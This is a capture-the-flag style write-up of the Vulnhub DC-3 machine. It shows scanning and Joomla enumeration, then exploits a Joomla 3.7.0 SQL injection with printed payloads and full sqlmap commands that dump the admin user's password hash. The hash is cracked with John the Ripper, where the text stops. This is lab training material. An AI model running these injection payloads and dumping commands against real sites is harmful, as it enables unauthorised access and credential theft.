---
title: Write-up DC3 on Vulnhub
author: eMVee
date: 2023-03-27 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP, SQLi, kernel, Joomla]
render_with_liquid: false
---

While preparing for the OSCP exam, you have to gain more experience in hacking and building your methodology to pass the exam. This machine is not listed on the famous TJnull OSCP list, but it is related to several machines on that list. The machine can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/dc-32,312/).
After downloading the virtual machine, you have to configure the machine so it is on the same network as your Kali machine.


## Getting started
First create a working directory for this Vulnhub machine.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd DC-3
```
Now I would like to know my own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ myip    

    inet 127.0.0.1
    inet 10.0.2.15

```
Since I know my IP address it is time to identify other IP addresses in my virtual network. The first command I use is with fping.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.32
```
Another method to identify IP addresses on my network is with arp-scan. I normally use arp-scan as second method since the results could be different.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ sudo arp-scan --localnet        
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:45:23:77       PCS Systemtechnik GmbH
10.0.2.32       08:00:27:10:91:0b       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.027 seconds (126.30 hosts/sec). 4 responded
```
There is a new IP address in my virtual network. Now let's create a variable called `ip` which has the IP address of the target assigned.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ ip=10.0.2.32
```


----

## Enumeration

Now we are ready to rumble! Let's run a quick and basis port scan with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ nmap -sC -p- $ip -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-26 22:15 CEST
Nmap scan report for 10.0.2.32
Host is up (0.00013s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management

Nmap done: 1 IP address (1 host up) scanned in 2.90 seconds

```
nmap found one open port:
* Port 80
	* HTTP
	* Joomla

Let's check with whatweb the technologies used on this webservice.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ whatweb http://$ip                      
http://10.0.2.32 [200 OK] Apache[2.4.18], Bootstrap, Cookies[460ada11b31d3c5e5ca6e58fd5d3de27], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[460ada11b31d3c5e5ca6e58fd5d3de27], IP[10.0.2.32], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]

```

Some interesting details were found by whatweb:
* Linux, probably Ubuntu
* Apache 2.4.18
* Joomla

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ nikto -h http://$ip 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.32
+ Target Hostname:    10.0.2.32
+ Target Port:        80
+ Start Time:         2023-03-26 22:20:20 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-8193: /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: /administrator/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
+ /administrator/index.php: Admin login page/section found.
+ 8726 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2023-03-26 22:21:35 (GMT2) (75 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nikto found the administrator login page. Let's add this to our notes.
* /administrator

Since the website is a Joomla CMS we can use `joomscan` to enumerate some information about the website.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ joomscan -u http://$ip
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.0.2.32 ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.0.2.32/administrator/components
http://10.0.2.32/administrator/modules
http://10.0.2.32/administrator/templates
http://10.0.2.32/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.0.2.32/administrator/

[+] Checking robots.txt existing
[++] robots.txt is not found

[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/10.0.2.32/  
```
The website is running on Joomla version 3.7. Perhaps there is a known vulnerability in this version available. Let's check with searchsploit for known vulnerabilities.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ searchsploit joomla 3.7         
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7 - SQL Injection                                                                                                                                                                              | php/remote/44227.php
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                                                                               | php/webapps/42033.txt
Joomla! Component ARI Quiz 3.7.4 - SQL Injection                                                                                                                                                         | php/webapps/46769.txt
Joomla! Component com_realestatemanager 3.7 - SQL Injection                                                                                                                                              | php/webapps/38445.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                                                                                            | php/webapps/43488.txt
Joomla! Component J2Store < 3.3.7 - SQL Injection                                                                                                                                                        | php/webapps/46467.txt
Joomla! Component JomEstate PRO 3.7 - 'id' SQL Injection                                                                                                                                                 | php/webapps/44117.txt
Joomla! Component Jtag Members Directory 5.3.7 - Arbitrary File Download                                                                                                                                 | php/webapps/43913.txt
Joomla! Component Quiz Deluxe 3.7.4 - SQL Injection                                                                                                                                                      | php/webapps/42589.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```
It looks like there is a SQL Injection present in version 3.7. Now let's copy the known exploit to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ searchsploit -m 42033  
  Exploit: Joomla! 3.7.0 - 'com_fields' SQL Injection
      URL: https://www.exploit-db.com/exploits/42033
     Path: /usr/share/exploitdb/exploits/php/webapps/42033.txt
    Codes: CVE-2017-8917
 Verified: False
File Type: ASCII text
Copied to: /home/emvee/Documents/Vulnhub/DC-3/42033.txt
```
As soon as the exploit is copied into our working directory it is time to check how the exploits works.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ cat 42033.txt                                
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu) 
```
This exploit is pretty eaasy to exploit with SQLmap.
First we have to enumerate the databases via SQLmap.
```
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
        ___
       __H__                                                                                                                                                                                                                               
 ___ ___["]_____ ___ ___  {1.6.11#stable}                                                                                                                                                                                                  
|_ -| . [,]     | .'| . |                                                                                                                                                                                                                  
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:37:44 /2023-03-26/

[22:37:44] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; es-AR; rv:1.9) Gecko/2008061015 Ubuntu/8.04 (hardy) Firefox/3.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[22:37:44] [INFO] testing connection to the target URL
[22:37:44] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=1je84u1os76...dt3mr85es2'). Do you want to use those [Y/n] y
[22:37:53] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:37:53] [INFO] testing if the target URL content is stable
[22:37:53] [INFO] target URL content is stable
[22:37:53] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
[22:37:53] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
[22:37:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:37:57] [WARNING] reflective value(s) found and filtering out
[22:38:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[22:38:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[22:38:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[22:38:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'

<---- SNIP ---->

[22:39:04] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[22:39:05] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[22:39:05] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 2716 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(2212,CONCAT(0x2e,0x716b6b7171,(SELECT (ELT(2212=2212,1))),0x7176626b71),1776))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7732 FROM (SELECT(SLEEP(5)))dwep)
---
[22:39:21] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.1
[22:39:21] [INFO] fetching database names
[22:39:21] [INFO] retrieved: 'information_schema'
[22:39:21] [INFO] retrieved: 'joomladb'
[22:39:21] [INFO] retrieved: 'mysql'
[22:39:21] [INFO] retrieved: 'performance_schema'
[22:39:21] [INFO] retrieved: 'sys'
available databases [5]:
[*] information_schema
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys

[22:39:21] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2675 times
[22:39:21] [INFO] fetched data logged to text files under '/home/emvee/.local/share/sqlmap/output/10.0.2.32'

[*] ending @ 22:39:21 /2023-03-26/

```
There are 5 databases available. There is only one database (for now) which I am interested in.
* joomladb

Let's enumerate the tables in this database with SQLmap.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
        ___
       __H__                                                                            
 ___ ___[)]_____ ___ ___  {1.6.11#stable}                                               
|_ -| . [']     | .'| . |                                                               
|___|_  ["]_|_|_|__,|  _|                                                               
      |_|V...       |_|   https://sqlmap.org                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:40:24 /2023-03-26/

[22:40:24] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[22:40:24] [INFO] resuming back-end DBMS 'mysql' 
[22:40:24] [INFO] testing connection to the target URL
[22:40:24] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=5r4ta08daog...oojais58d0'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(2212,CONCAT(0x2e,0x716b6b7171,(SELECT (ELT(2212=2212,1))),0x7176626b71),1776))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7732 FROM (SELECT(SLEEP(5)))dwep)
---
[22:40:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.1
[22:40:26] [INFO] fetching tables for database: 'joomladb'
[22:40:26] [INFO] retrieved: '#__assets'
[22:40:26] [INFO] retrieved: '#__associations'
[22:40:26] [INFO] retrieved: '#__banner_clients'
[22:40:26] [INFO] retrieved: '#__banner_tracks'
[22:40:26] [INFO] retrieved: '#__banners'
[22:40:27] [INFO] retrieved: '#__bsms_admin'
[22:40:27] [INFO] retrieved: '#__bsms_books'
[22:40:27] [INFO] retrieved: '#__bsms_comments'
[22:40:27] [INFO] retrieved: '#__bsms_locations'
[22:40:27] [INFO] retrieved: '#__bsms_mediafiles'
[22:40:27] [INFO] retrieved: '#__bsms_message_typ'
[22:40:27] [INFO] retrieved: '#__bsms_podcast'
[22:40:27] [INFO] retrieved: '#__bsms_series'
[22:40:27] [INFO] retrieved: '#__bsms_servers'
[22:40:27] [INFO] retrieved: '#__bsms_studies'
[22:40:27] [INFO] retrieved: '#__bsms_studytopics'
[22:40:27] [INFO] retrieved: '#__bsms_teachers'
[22:40:27] [INFO] retrieved: '#__bsms_templatecod'
[22:40:27] [INFO] retrieved: '#__bsms_templates'
[22:40:27] [INFO] retrieved: '#__bsms_timeset'
[22:40:27] [INFO] retrieved: '#__bsms_topics'
[22:40:27] [INFO] retrieved: '#__bsms_update'
[22:40:27] [INFO] retrieved: '#__categories'
[22:40:27] [INFO] retrieved: '#__contact_details'
[22:40:27] [INFO] retrieved: '#__content'
[22:40:27] [INFO] retrieved: '#__content_frontpag'
[22:40:27] [INFO] retrieved: '#__content_rating'
[22:40:27] [INFO] retrieved: '#__content_types'
[22:40:27] [INFO] retrieved: '#__contentitem_tag_'
[22:40:27] [INFO] retrieved: '#__core_log_searche'
[22:40:27] [INFO] retrieved: '#__extensions'
[22:40:27] [INFO] retrieved: '#__fields'
[22:40:27] [INFO] retrieved: '#__fields_categorie'
[22:40:27] [INFO] retrieved: '#__fields_groups'
[22:40:27] [INFO] retrieved: '#__fields_values'
[22:40:27] [INFO] retrieved: '#__finder_filters'
[22:40:27] [INFO] retrieved: '#__finder_links'
[22:40:27] [INFO] retrieved: '#__finder_links_ter'
[22:40:27] [INFO] retrieved: '#__finder_links_ter'
[22:40:27] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_links_ter'
[22:40:28] [INFO] retrieved: '#__finder_taxonomy'
[22:40:28] [INFO] retrieved: '#__finder_taxonomy_'
[22:40:28] [INFO] retrieved: '#__finder_terms'
[22:40:28] [INFO] retrieved: '#__finder_terms_com'
[22:40:28] [INFO] retrieved: '#__finder_tokens'
[22:40:28] [INFO] retrieved: '#__finder_tokens_ag'
[22:40:28] [INFO] retrieved: '#__finder_types'
[22:40:28] [INFO] retrieved: '#__jbsbackup_timese'
[22:40:28] [INFO] retrieved: '#__jbspodcast_times'
[22:40:28] [INFO] retrieved: '#__languages'
[22:40:28] [INFO] retrieved: '#__menu'
[22:40:28] [INFO] retrieved: '#__menu_types'
[22:40:28] [INFO] retrieved: '#__messages'
[22:40:28] [INFO] retrieved: '#__messages_cfg'
[22:40:28] [INFO] retrieved: '#__modules'
[22:40:28] [INFO] retrieved: '#__modules_menu'
[22:40:28] [INFO] retrieved: '#__newsfeeds'
[22:40:28] [INFO] retrieved: '#__overrider'
[22:40:28] [INFO] retrieved: '#__postinstall_mess'
[22:40:28] [INFO] retrieved: '#__redirect_links'
[22:40:28] [INFO] retrieved: '#__schemas'
[22:40:28] [INFO] retrieved: '#__session'
[22:40:28] [INFO] retrieved: '#__tags'
[22:40:28] [INFO] retrieved: '#__template_styles'
[22:40:28] [INFO] retrieved: '#__ucm_base'
[22:40:29] [INFO] retrieved: '#__ucm_content'
[22:40:29] [INFO] retrieved: '#__ucm_history'
[22:40:29] [INFO] retrieved: '#__update_sites'
[22:40:29] [INFO] retrieved: '#__update_sites_ext'
[22:40:29] [INFO] retrieved: '#__updates'
[22:40:29] [INFO] retrieved: '#__user_keys'
[22:40:29] [INFO] retrieved: '#__user_notes'
[22:40:29] [INFO] retrieved: '#__user_profiles'
[22:40:29] [INFO] retrieved: '#__user_usergroup_m'
[22:40:29] [INFO] retrieved: '#__usergroups'
[22:40:29] [INFO] retrieved: '#__users'
[22:40:29] [INFO] retrieved: '#__utf8_conversion'
[22:40:29] [INFO] retrieved: '#__viewlevels'
Database: joomladb
[76 tables]
+---------------------+
| #__assets           |
| #__associations     |
| #__banner_clients   |
| #__banner_tracks    |
| #__banners          |
| #__bsms_admin       |
| #__bsms_books       |
| #__bsms_comments    |
| #__bsms_locations   |
| #__bsms_mediafiles  |
| #__bsms_message_typ |
| #__bsms_podcast     |
| #__bsms_series      |
| #__bsms_servers     |
| #__bsms_studies     |
| #__bsms_studytopics |
| #__bsms_teachers    |
| #__bsms_templatecod |
| #__bsms_templates   |
| #__bsms_timeset     |
| #__bsms_topics      |
| #__bsms_update      |
| #__categories       |
| #__contact_details  |
| #__content_frontpag |
| #__content_rating   |
| #__content_types    |
| #__content          |
| #__contentitem_tag_ |
| #__core_log_searche |
| #__extensions       |
| #__fields_categorie |
| #__fields_groups    |
| #__fields_values    |
| #__fields           |
| #__finder_filters   |
| #__finder_links_ter |
| #__finder_links     |
| #__finder_taxonomy_ |
| #__finder_taxonomy  |
| #__finder_terms_com |
| #__finder_terms     |
| #__finder_tokens_ag |
| #__finder_tokens    |
| #__finder_types     |
| #__jbsbackup_timese |
| #__jbspodcast_times |
| #__languages        |
| #__menu_types       |
| #__menu             |
| #__messages_cfg     |
| #__messages         |
| #__modules_menu     |
| #__modules          |
| #__newsfeeds        |
| #__overrider        |
| #__postinstall_mess |
| #__redirect_links   |
| #__schemas          |
| #__session          |
| #__tags             |
| #__template_styles  |
| #__ucm_base         |
| #__ucm_content      |
| #__ucm_history      |
| #__update_sites_ext |
| #__update_sites     |
| #__updates          |
| #__user_keys        |
| #__user_notes       |
| #__user_profiles    |
| #__user_usergroup_m |
| #__usergroups       |
| #__users            |
| #__utf8_conversion  |
| #__viewlevels       |
+---------------------+

[22:40:29] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 93 times
[22:40:29] [INFO] fetched data logged to text files under '/home/emvee/.local/share/sqlmap/output/10.0.2.32'

[*] ending @ 22:40:29 /2023-03-26/

```
There are multiple tables in this database. But for now I am interested in the `#__users ` table. In this table there are probably usernames, hashes of password or even plaintext passwords stored. If there are plaintext passwords it would be bad, very bad. So if we are lucky one of those are available for us.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --dump -p list[fullordering]
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___["]_____ ___ ___  {1.6.11#stable}                                                                                                                                                                                                   
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:09:29 /2023-03-27/

[09:09:29] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060821 Firefox/2.0b2' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[09:09:30] [INFO] resuming back-end DBMS 'mysql' 
[09:09:30] [INFO] testing connection to the target URL
[09:09:30] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=8712fihl57j...5kbthbt5e6'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(2212,CONCAT(0x2e,0x716b6b7171,(SELECT (ELT(2212=2212,1))),0x7176626b71),1776))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7732 FROM (SELECT(SLEEP(5)))dwep)
---
[09:09:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.1
[09:09:33] [INFO] fetching columns for table '#__users' in database 'joomladb'
[09:09:33] [WARNING] unable to retrieve column names for table '#__users' in database 'joomladb'
do you want to use common column existence check? [y/N/q] y
[09:09:34] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[09:09:36] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
[09:09:36] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 
[09:09:37] [WARNING] running in a single-thread mode. This could take a while
[09:09:37] [INFO] retrieved: id                                                                                                                                                                                                            
[09:09:37] [INFO] retrieved: name                                                                                                                                                                                                          
[09:09:37] [INFO] retrieved: username                                                                                                                                                                                                      
[09:09:38] [INFO] retrieved: email                                                                                                                                                                                                         
[09:09:42] [INFO] retrieved: password                                                                                                                                                                                                      
[09:10:28] [INFO] retrieved: params                                                                                                                                                                                                        
                                                                                                                                                                                                                                           
[09:10:41] [INFO] fetching entries for table '#__users' in database 'joomladb'
[09:10:41] [INFO] retrieved: 'freddy@norealaddress.net'
[09:10:41] [INFO] retrieved: '629'
[09:10:41] [INFO] retrieved: 'admin'
[09:10:41] [INFO] retrieved: '{"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""}'
[09:10:41] [INFO] retrieved: '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'
[09:10:41] [INFO] retrieved: 'admin'
Database: joomladb
Table: #__users
[1 entry]
+-----+-------+--------------------------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+----------+
| id  | name  | email                    | params                                                                                       | password                                                     | username |
+-----+-------+--------------------------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+----------+
| 629 | admin | freddy@norealaddress.net | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    |
+-----+-------+--------------------------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+----------+

[09:10:41] [INFO] table 'joomladb.`#__users`' dumped to CSV file '/home/emvee/.local/share/sqlmap/output/10.0.2.32/dump/joomladb/#__users.csv'
[09:10:41] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2671 times
[09:10:41] [INFO] fetched data logged to text files under '/home/emvee/.local/share/sqlmap/output/10.0.2.32'

[*] ending @ 09:10:41 /2023-03-27/

```
There is one user and a hash available in this table.
* User: `admin`
* Hash: `$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`

So copy the hash to a file so we can crack the hash.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > hash

┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ cat hash     
$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```
Now let's use John The Ripper #JTR  to crack the hash of the password.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snoopy           (?)     
1g 0:00:00:00 DONE (2023-03-27 09:25) 1.250g/s 180.0p/s 180.0c/s 180.0C/s mylove..sandra
